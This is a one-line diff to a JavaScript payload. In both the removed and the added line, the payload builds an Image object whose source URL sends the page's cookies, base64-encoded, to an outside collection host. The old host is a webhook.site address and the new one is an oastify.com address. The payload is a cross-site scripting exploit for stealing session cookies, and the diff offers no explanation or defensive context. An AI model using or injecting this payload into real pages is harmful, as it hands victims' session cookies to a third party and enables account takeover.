@@ -1,1 +1,1 @@
-x = new Image(); x.src ='https://webhook.site/9ced10cc-c98e-42e8-b613-b927d68fe399?data='+btoa(document.cookie);
+x = new Image(); x.src ='https://iug4j56ds5l9gbczo9m98mbfz65ytphe.oastify.com?data='+btoa(document.cookie);
